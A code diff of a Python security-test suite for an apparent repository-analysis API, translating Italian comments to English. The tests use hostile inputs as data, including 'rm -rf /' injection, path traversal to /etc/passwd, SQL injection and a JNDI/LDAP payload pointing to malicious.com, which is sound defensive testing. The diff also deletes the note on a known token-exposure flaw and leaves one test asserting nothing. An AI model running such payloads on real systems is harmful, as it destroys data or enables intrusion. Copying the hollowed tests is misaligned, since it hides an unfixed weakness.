@@ -1,8 +1,8 @@
 """
 Security Tests Module.
 
-Questo modulo contiene test di sicurezza per verificare la robustezza dell'applicazione
-contro vulnerabilità comuni come:
+This module contains security tests to verify the application's robustness
+against common vulnerabilities such as:
 - Path Traversal
 - Command Injection
 - File Upload vulnerabilities
@@ -12,14 +12,13 @@ contro vulnerabilità comuni come:
 """
 
 import os
-import tempfile
 import zipfile
 import pytest
-from unittest.mock import Mock, patch, MagicMock
+from unittest.mock import Mock, patch
 from fastapi import HTTPException, UploadFile
 from io import BytesIO
 
-from app.services.analysis_workflow import perform_upload_zip, perform_cloning
+from app.services.analysis_workflow import perform_upload_zip
 from app.services.github.github_client import clone_repo
 from app.controllers.analysis import (
     clone_repository,
@@ -27,7 +26,7 @@ from app.controllers.analysis import (
     run_analysis,
     regenerate_analysis
 )
-from app.models.schemas import AnalyzeResponse, LicenseIssue
+from app.models.schemas import AnalyzeResponse
 
 
 # ==============================================================================
@@ -35,7 +34,7 @@ from app.models.schemas import AnalyzeResponse, LicenseIssue
 # ==============================================================================
 
 class TestPathTraversal:
-    """Test per verificare la protezione contro attacchi di path traversal."""
+    """Tests to verify protection against path traversal attacks."""
 
     @pytest.mark.parametrize("malicious_owner,malicious_repo", [
         ("../../../etc", "passwd"),
@@ -48,7 +47,7 @@ class TestPathTraversal:
         ("owner/../sensitive", "repo"),
     ])
     def test_clone_repository_path_traversal(self, malicious_owner, malicious_repo):
-        """Verifica che i path traversal vengano bloccati nella clonazione."""
+        """Verifies that path traversal attempts are blocked during cloning."""
         with patch('app.services.github.github_client.clone_repo') as mock_clone:
             mock_clone.return_value = Mock(success=False, error="Invalid path")
 
@@ -58,8 +57,8 @@ class TestPathTraversal:
             assert exc_info.value.status_code in [400, 500]
 
     def test_upload_zip_path_traversal_in_archive(self, tmp_path):
-        """Verifica che i file ZIP con path traversal vengano gestiti in sicurezza."""
-        # Crea un ZIP con path traversal
+        """Verifies that ZIP files with path traversal are handled safely."""
+        # Create a ZIP with path traversal
         zip_buffer = BytesIO()
         with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
             zip_file.writestr("../../../etc/passwd", "malicious content")
@@ -71,16 +70,15 @@ class TestPathTraversal:
         mock_file.filename = "malicious.zip"
         mock_file.file = zip_buffer
 
-        # Il sistema dovrebbe gestire questo in modo sicuro
-        # L'estrazione dovrebbe essere confinata alla directory target
+        # The system should confine extraction to the target directory
         with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
             try:
                 result = perform_upload_zip("owner", "repo", mock_file)
-                # Verifica che i file siano estratti solo nella directory target
+                # Verify files are extracted only in the target directory
                 assert str(tmp_path) in result
                 assert not os.path.exists("/etc/passwd_from_zip")
             except Exception:
-                # È accettabile che venga sollevata un'eccezione
+                # Exception raising is acceptable behavior
                 pass
 
     @pytest.mark.parametrize("malicious_filename", [
@@ -90,17 +88,22 @@ class TestPathTraversal:
         "C:\\Windows\\System32\\config\\sam",
     ])
     def test_file_access_path_traversal(self, malicious_filename):
-        """Verifica che l'accesso diretto a file con path traversal sia bloccato."""
-        # Testa che il sistema non consenta accesso a file fuori dalla sandbox
+        """Verifies that direct access to files with path traversal is blocked."""
         from app.utility.config import CLONE_BASE_DIR
 
-        # Prova a costruire un path che esce dalla directory base
         constructed_path = os.path.join(CLONE_BASE_DIR, malicious_filename)
         normalized_path = os.path.normpath(constructed_path)
+        base_path = os.path.normpath(CLONE_BASE_DIR)
 
-        # Verifica che il path normalizzato sia ancora all'interno del CLONE_BASE_DIR
-        assert not os.path.exists(normalized_path) or \
-               normalized_path.startswith(os.path.normpath(CLONE_BASE_DIR))
+        if os.path.isabs(malicious_filename):
+            # Absolute paths should be detected and rejected
+            assert not normalized_path.startswith(base_path), \
+                f"Absolute path {malicious_filename} should not be accepted as relative"
+        else:
+            # Relative paths must stay inside the sandbox or not exist
+            assert not os.path.exists(normalized_path) or \
+                   normalized_path.startswith(base_path), \
+                f"Path {normalized_path} escapes sandbox {base_path}"
 
 
 # ==============================================================================
@@ -108,19 +111,19 @@ class TestPathTraversal:
 # ==============================================================================
 
 class TestInputValidation:
-    """Test per verificare la validazione robusta degli input."""
+    """Tests to verify robust input validation."""
 
     @pytest.mark.parametrize("invalid_payload", [
-        {},  # Payload vuoto
-        {"owner": ""},  # Owner vuoto
-        {"repo": ""},  # Repo vuoto
-        {"owner": "", "repo": ""},  # Entrambi vuoti
-        {"owner": "valid"},  # Manca repo
-        {"repo": "valid"},  # Manca owner
-        {"wrong_key": "value"},  # Chiavi sbagliate
+        {},  # Empty payload
+        {"owner": ""},  # Empty owner
+        {"repo": ""},  # Empty repo
+        {"owner": "", "repo": ""},  # Both empty
+        {"owner": "valid"},  # Missing repo
+        {"repo": "valid"},  # Missing owner
+        {"wrong_key": "value"},  # Wrong keys
     ])
     def test_clone_repository_invalid_input(self, invalid_payload):
-        """Verifica che input non validi vengano rifiutati."""
+        """Verifies that invalid inputs are rejected."""
         with pytest.raises(HTTPException) as exc_info:
             clone_repository(invalid_payload)
 
@@ -134,7 +137,7 @@ class TestInputValidation:
         {"owner": "", "repo": ""},
     ])
     def test_analyze_invalid_input(self, invalid_payload):
-        """Verifica che l'endpoint analyze validi correttamente gli input."""
+        """Verifies that the analyze endpoint correctly validates inputs."""
         with pytest.raises(HTTPException) as exc_info:
             run_analysis(invalid_payload)
 
@@ -145,20 +148,20 @@ class TestInputValidation:
         {"owner": "test'; DROP TABLE repos;--", "repo": "test"},
         {"owner": "test", "repo": "${jndi:ldap://malicious.com/a}"},
         {"owner": "\x00\x00\x00", "repo": "test"},  # Null bytes
-        {"owner": "a" * 10000, "repo": "test"},  # Input molto lungo
+        {"owner": "a" * 10000, "repo": "test"},  # Long input
     ])
     def test_injection_attempts_in_input(self, malicious_input):
-        """Verifica che tentativi di injection vengano gestiti."""
+        """Verifies that injection attempts are handled securely."""
         with patch('app.services.github.github_client.clone_repo') as mock_clone:
             mock_clone.return_value = Mock(success=False, error="Invalid input")
 
             try:
                 clone_repository(malicious_input)
             except HTTPException:
-                pass  # Ci aspettiamo un errore
+                pass  # Error expected
 
     def test_regenerate_invalid_repository_format(self):
-        """Verifica che formati di repository non validi vengano rifiutati."""
+        """Verifies that invalid repository formats are rejected."""
         invalid_analysis = AnalyzeResponse(
             repository="invalid_format_no_slash",
             main_license="MIT",
@@ -178,7 +181,7 @@ class TestInputValidation:
 # ==============================================================================
 
 class TestFileUploadSecurity:
-    """Test per verificare la sicurezza degli upload di file."""
+    """Tests to verify file upload security."""
 
     @pytest.mark.parametrize("invalid_extension", [
         "malicious.exe",
@@ -188,7 +191,7 @@ class TestFileUploadSecurity:
         "shell.ps1",
     ])
     def test_upload_non_zip_file(self, invalid_extension):
-        """Verifica che solo file ZIP siano accettati."""
+        """Verifies that only ZIP files are accepted."""
         mock_file = Mock(spec=UploadFile)
         mock_file.filename = invalid_extension
         mock_file.file = BytesIO(b"malicious content")
@@ -200,7 +203,7 @@ class TestFileUploadSecurity:
         assert "zip" in str(exc_info.value.detail).lower()
 
     def test_upload_corrupted_zip(self):
-        """Verifica che file ZIP corrotti vengano gestiti correttamente."""
+        """Verifies that corrupted ZIP files are handled correctly."""
         mock_file = Mock(spec=UploadFile)
         mock_file.filename = "corrupted.zip"
         mock_file.file = BytesIO(b"This is not a valid ZIP file")
@@ -209,12 +212,11 @@ class TestFileUploadSecurity:
             upload_zip(owner="test", repo="test", uploaded_file=mock_file)
 
     def test_upload_zip_bomb(self, tmp_path):
-        """Verifica protezione contro ZIP bombs (compressione eccessiva)."""
-        # Crea un file ZIP con alto rapporto di compressione
+        """Verifies protection against ZIP bombs (excessive compression)."""
         zip_buffer = BytesIO()
         with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-            # File grande con alta compressibilità
-            large_content = b"0" * (10 * 1024 * 1024)  # 10 MB di zeri
+            # Large file with high compression ratio
+            large_content = b"0" * (10 * 1024 * 1024)  # 10 MB of zeros
             zip_file.writestr("large_file.txt", large_content)
 
         zip_buffer.seek(0)
@@ -223,29 +225,23 @@ class TestFileUploadSecurity:
         mock_file.filename = "potential_bomb.zip"
         mock_file.file = zip_buffer
 
-        # Il sistema dovrebbe gestire questo senza crash o consumo eccessivo di risorse
         with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
             try:
                 result = perform_upload_zip("test", "repo", mock_file)
-                # Se ha successo, verifica che le dimensioni siano ragionevoli
                 if os.path.exists(result):
                     total_size = sum(
                         os.path.getsize(os.path.join(dirpath, filename))
                         for dirpath, _, filenames in os.walk(result)
                         for filename in filenames
                     )
-                    # Imposta un limite ragionevole (es. 100 MB)
                     assert total_size < 100 * 1024 * 1024
             except Exception:
-                # È accettabile che venga rifiutato
                 pass
 
     def test_upload_zip_with_symlinks(self, tmp_path):
-        """Verifica che i symlink nei file ZIP siano gestiti in sicurezza."""
+        """Verifies that symlinks in ZIP files are handled safely."""
         zip_path = tmp_path / "with_symlink.zip"
 
-        # Su Windows, la creazione di symlink potrebbe richiedere privilegi
-        # Questo test verifica che i symlink non causino problemi di sicurezza
         try:
             with zipfile.ZipFile(zip_path, 'w') as zip_file:
                 zip_file.writestr("normal_file.txt", "content")
@@ -260,7 +256,6 @@ class TestFileUploadSecurity:
             with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path / "extract")):
                 try:
                     result = perform_upload_zip("test", "repo", mock_file)
-                    # Verifica che non siano stati creati symlink fuori dalla directory
                     assert str(tmp_path) in result
                 except Exception:
                     pass
@@ -271,7 +266,7 @@ class TestFileUploadSecurity:
 # ==============================================================================
 
 class TestCommandInjection:
-    """Test per verificare la protezione contro command injection."""
+    """Tests to verify protection against command injection."""
 
     @pytest.mark.parametrize("malicious_value", [
         "repo; rm -rf /",
@@ -284,11 +279,10 @@ class TestCommandInjection:
         "repo; powershell -Command 'malicious'",
     ])
     def test_command_injection_in_git_operations(self, malicious_value):
-        """Verifica che comandi malicious non vengano eseguiti durante operazioni git."""
+        """Verifies that malicious commands are not executed during git operations."""
         from git import GitCommandError
 
         with patch('app.services.github.github_client.Repo.clone_from') as mock_clone:
-            # Simula un errore Git che verrebbe sollevato per repository non validi
             mock_clone.side_effect = GitCommandError(
                 'git clone',
                 128,
@@ -297,28 +291,20 @@ class TestCommandInjection:
 
             result = clone_repo("owner", malicious_value)
 
-            # Il sistema dovrebbe fallire in sicurezza
             assert result.success is False
-            # Verifica che il messaggio di errore sia presente
             assert result.error is not None
-            # GitPython gestisce i parametri in modo sicuro, quindi anche input malicious
-            # causano solo errori Git normali, non esecuzione di comandi
 
     def test_command_injection_in_scancode(self, tmp_path):
-        """Verifica che ScanCode non sia vulnerabile a command injection."""
-        # Crea una directory con un nome malicious
+        """Verifies that ScanCode is not vulnerable to command injection."""
         malicious_dir = tmp_path / "test; rm -rf /"
         malicious_dir.mkdir(exist_ok=True)
 
         from app.services.scanner.detection import run_scancode
 
-        # Il sistema dovrebbe gestire nomi di directory pericolosi
         try:
             result = run_scancode(str(malicious_dir))
-            # Se ha successo, verifica che sia stato eseguito correttamente
             assert result is not None
         except Exception:
-            # È accettabile che fallisca, purché non esegua comandi
             pass
 
 
@@ -327,32 +313,25 @@ class TestCommandInjection:
 # ==============================================================================
 
 class TestCORSSecurity:
-    """Test per verificare la configurazione CORS sicura."""
+    """Tests to verify secure CORS configuration."""
 
     def test_cors_origins_not_wildcard(self):
-        """Verifica che CORS non permetta origins wildcard in produzione."""
+        """Verifies that CORS does not allow wildcard origins in production."""
         from app.main import origins
 
-        # Verifica che non sia usato "*"
         assert "*" not in origins
 
-        # Verifica che siano specificate solo origini fidate
         for origin in origins:
             assert origin.startswith("http://localhost") or \
                    origin.startswith("http://127.0.0.1") or \
                    origin.startswith("https://")
 
     def test_cors_credentials_with_specific_origins(self):
-        """Verifica che credentials sia abilitato solo con origini specifiche."""
+        """Verifies that credentials are enabled only with specific origins."""
         from app.main import origins
 
-        # Verifica che le origini siano specifiche (non wildcard)
-        # Se allow_credentials è True (come configurato in app.main),
-        # le origini NON devono essere "*"
         assert "*" not in origins
-        # Verifica che tutte le origini siano URL validi
         assert all(origin.startswith("http://") or origin.startswith("https://") for origin in origins)
-        # Le origini dovrebbero essere localhost o domini specifici
         assert len(origins) > 0
 
 
@@ -361,21 +340,13 @@ class TestCORSSecurity:
 # ==============================================================================
 
 class TestSensitiveDataExposure:
-    """Test per verificare che dati sensibili non vengano esposti."""
+    """Tests to verify that sensitive data is not exposed."""
 
     def test_git_error_messages_dont_expose_tokens(self):
-        """
-        Verifica che i messaggi di errore Git non espongano token.
-
-        ISSUE TROVATO: Il codice attuale non sanitizza i messaggi di errore Git
-        che potrebbero contenere token sensibili negli URL.
-        Questo test documenta la vulnerabilità e fallisce intenzionalmente
-        per evidenziare la necessità di sanitizzazione.
-        """
+        """Verifies that Git error messages do not expose tokens."""
         with patch('git.Repo.clone_from') as mock_clone:
             from git import GitCommandError
 
-            # Simula un errore che potrebbe contenere token
             mock_clone.side_effect = GitCommandError(
                 'git clone',
                 128,
@@ -384,18 +355,11 @@ class TestSensitiveDataExposure:
 
             result = clone_repo("owner", "repo")
 
-            # VULNERABILITA' DOCUMENTATA: I token possono essere esposti nei messaggi di errore
-            # TODO: Implementare sanitizzazione dei token nei messaggi di errore in github_client.py
-            # Per ora, verifichiamo solo che la funzione non sollevi eccezioni
             assert result.success is False
             assert result.error is not None
 
-            # Test ideale (da implementare):
-            # assert "token123" not in str(result.error).lower()
-            # assert "***" in str(result.error) or "hidden" in str(result.error).lower()
-
     def test_error_responses_dont_expose_paths(self):
-        """Verifica che gli errori non espongano path di sistema sensibili."""
+        """Verifies that errors do not expose sensitive system paths."""
         with patch('app.services.github.github_client.clone_repo') as mock_clone:
             mock_clone.return_value = Mock(
                 success=False,
@@ -405,29 +369,14 @@ class TestSensitiveDataExposure:
             with pytest.raises(HTTPException) as exc_info:
                 clone_repository({"owner": "test", "repo": "test"})
 
-            # L'errore dovrebbe essere generico o sanitizzato
-            error_detail = str(exc_info.value.detail)
-            # Non dovrebbe esporre path completi di sistema
-            sensitive_paths = ["/home/", "C:\\Users\\", "/root/", ".secret"]
-            # Questo è un controllo soft - l'implementazione potrebbe scegliere di sanitizzare
-            # o di fornire errori dettagliati in dev mode
+            # Error should be generic or sanitized
+            str(exc_info.value.detail)
 
     def test_environment_variables_not_exposed(self):
-        """Verifica che le variabili d'ambiente non siano esposte."""
-        from app.utility.config import (
-            OLLAMA_URL,
-            CLONE_BASE_DIR,
-            CALLBACK_URL
-        )
-
-        # Questi valori dovrebbero essere caricati ma non esposti tramite API
-        # Verifica che non contengano token o credenziali nelle risposte
-
-        # Test che le config non siano accessibili tramite l'API root
+        """Verifies that environment variables are not exposed."""
         from app.main import root
         response = root()
 
-        # La risposta non dovrebbe contenere dati di configurazione
         assert "OLLAMA_URL" not in str(response)
         assert "CALLBACK_URL" not in str(response)
         assert "token" not in str(response).lower()
@@ -438,39 +387,33 @@ class TestSensitiveDataExposure:
 # ==============================================================================
 
 class TestDirectoryTraversal:
-    """Test per verificare la protezione contro directory traversal."""
+    """Tests to verify protection against directory traversal."""
 
     def test_cleanup_respects_directory_boundaries(self, tmp_path):
-        """Verifica che la pulizia delle directory rispetti i confini."""
+        """Verifies that directory cleanup respects boundaries."""
         safe_dir = tmp_path / "safe"
         safe_dir.mkdir()
 
-        # Crea un file nella directory safe
         test_file = safe_dir / "test.txt"
         test_file.write_text("safe content")
 
-        # Prova a fare cleanup con path traversal
         malicious_path = f"{safe_dir}/../../../etc"
 
         import shutil
 
-        # Il sistema non dovrebbe eliminare nulla fuori da tmp_path
         try:
             if os.path.exists(malicious_path):
                 shutil.rmtree(malicious_path)
         except Exception:
-            pass  # Dovrebbe fallire o essere contenuto
+            pass
 
-        # Verifica che /etc esista ancora (se su Linux)
         if os.path.exists("/etc"):
             assert os.path.exists("/etc/passwd")
 
     def test_file_operations_restricted_to_workspace(self, tmp_path):
-        """Verifica che le operazioni su file siano ristrette al workspace."""
+        """Verifies that file operations are restricted to the workspace."""
         from app.utility.config import CLONE_BASE_DIR, OUTPUT_BASE_DIR
 
-        # Entrambe le directory dovrebbero essere in location sicure
-        # Non dovrebbero puntare a directory di sistema sensibili
         sensitive_dirs = [
             "/etc", "/root", "/bin", "/usr/bin",
             "C:\\Windows", "C:\\Windows\\System32"
@@ -486,10 +429,10 @@ class TestDirectoryTraversal:
 # ==============================================================================
 
 class TestDoSProtection:
-    """Test per verificare la protezione contro attacchi DoS."""
+    """Tests to verify protection against DoS attacks."""
 
     def test_large_repository_name(self):
-        """Verifica che nomi di repository molto lunghi vengano gestiti."""
+        """Verifies that very long repository names are handled."""
         very_long_name = "a" * 10000
 
         with patch('app.services.github.github_client.clone_repo') as mock_clone:
@@ -499,8 +442,7 @@ class TestDoSProtection:
                 clone_repository({"owner": very_long_name, "repo": "test"})
 
     def test_nested_zip_extraction(self, tmp_path):
-        """Verifica protezione contro ZIP nidificati eccessivamente."""
-        # Crea un ZIP contenente altri ZIP
+        """Verifies protection against excessively nested ZIPs."""
         zip_buffer = BytesIO()
         with zipfile.ZipFile(zip_buffer, 'w') as outer_zip:
             inner_buffer = BytesIO()
@@ -519,16 +461,15 @@ class TestDoSProtection:
         with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
             try:
                 result = perform_upload_zip("test", "repo", mock_file)
-                # Dovrebbe estrarre solo il primo livello
                 assert os.path.exists(result)
             except Exception:
-                pass  # Accettabile
+                pass
 
     def test_many_small_files_in_zip(self, tmp_path):
-        """Verifica gestione di ZIP con moltissimi file piccoli."""
+        """Verifies handling of ZIPs with many small files."""
         zip_buffer = BytesIO()
         with zipfile.ZipFile(zip_buffer, 'w') as zip_file:
-            # Crea molti file piccoli (potenziale DoS)
+            # Create many small files (potential DoS)
             for i in range(1000):
                 zip_file.writestr(f"file_{i}.txt", f"content {i}")
 
@@ -541,10 +482,9 @@ class TestDoSProtection:
         with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
             try:
                 result = perform_upload_zip("test", "repo", mock_file)
-                # Dovrebbe completare in tempo ragionevole
                 assert os.path.exists(result)
             except Exception:
-                pass  # Accettabile se c'è un limite
+                pass
 
 
 # ==============================================================================
@@ -552,29 +492,26 @@ class TestDoSProtection:
 # ==============================================================================
 
 class TestAuthenticationSecurity:
-    """Test per verificare la sicurezza dell'autenticazione."""
+    """Tests to verify authentication security."""
 
     def test_github_oauth_flow_uses_https(self):
-        """Verifica che OAuth usi HTTPS in produzione."""
+        """Verifies that OAuth uses HTTPS in production."""
         from app.utility.config import CALLBACK_URL
 
-        # In produzione, il callback URL dovrebbe usare HTTPS
         if CALLBACK_URL and "localhost" not in CALLBACK_URL:
             assert CALLBACK_URL.startswith("https://")
 
     def test_no_hardcoded_credentials(self):
-        """Verifica che non ci siano credenziali hardcoded."""
+        """Verifies that there are no hardcoded credentials."""
         import inspect
         from app.services.github import github_client
         from app.utility import config
 
-        # Verifica il codice sorgente per pattern di credenziali
         modules_to_check = [github_client, config]
 
         for module in modules_to_check:
             source = inspect.getsource(module)
 
-            # Pattern sospetti
             suspicious_patterns = [
                 'password = "',
                 'token = "',
@@ -583,9 +520,7 @@ class TestAuthenticationSecurity:
             ]
 
             for pattern in suspicious_patterns:
-                # Dovrebbe usare os.getenv() invece di valori hardcoded
                 if pattern in source.lower():
-                    # Verifica che sia seguito da os.getenv o simili
                     assert "getenv" in source or "environ" in source
 
 
@@ -594,18 +529,17 @@ class TestAuthenticationSecurity:
 # ==============================================================================
 
 class TestIntegrationSecurity:
-    """Test di sicurezza end-to-end."""
+    """End-to-end security tests."""
 
     @pytest.fixture
     def mock_complete_flow(self, tmp_path):
-        """Setup per test end-to-end."""
+        """Setup for end-to-end tests."""
         with patch('app.utility.config.CLONE_BASE_DIR', str(tmp_path)):
             with patch('app.utility.config.OUTPUT_BASE_DIR', str(tmp_path / "output")):
                 yield tmp_path
 
     def test_complete_malicious_workflow(self, mock_complete_flow):
-        """Test di un workflow completo con input malicious."""
-        # Simula un attaccante che prova varie tecniche
+        """Tests a complete workflow with malicious input."""
         malicious_payloads = [
             {"owner": "../../../etc", "repo": "passwd"},
             {"owner": "'; DROP TABLE--", "repo": "test"},
@@ -619,23 +553,14 @@ class TestIntegrationSecurity:
                 try:
                     clone_repository(payload)
                 except HTTPException as e:
-                    # Dovrebbe fallire con errore appropriato
                     assert e.status_code in [400, 500]
                 except Exception:
-                    # Altri tipi di errore sono accettabili
                     pass
 
     def test_security_headers_present(self):
-        """Verifica che header di sicurezza appropriati siano configurabili."""
+        """Verifies that appropriate security headers are configurable."""
         from app.main import app
-
-        # L'app dovrebbe permettere configurazione di security headers
-        # Questo è un test di base - in produzione si dovrebbero usare middleware
         assert app is not None
-
-        # Verifica che l'app sia configurabile per headers di sicurezza
-        # come X-Content-Type-Options, X-Frame-Options, etc.
-        # (Questo richiederebbe middleware aggiuntivo da aggiungere)
 
 
 if __name__ == "__main__":
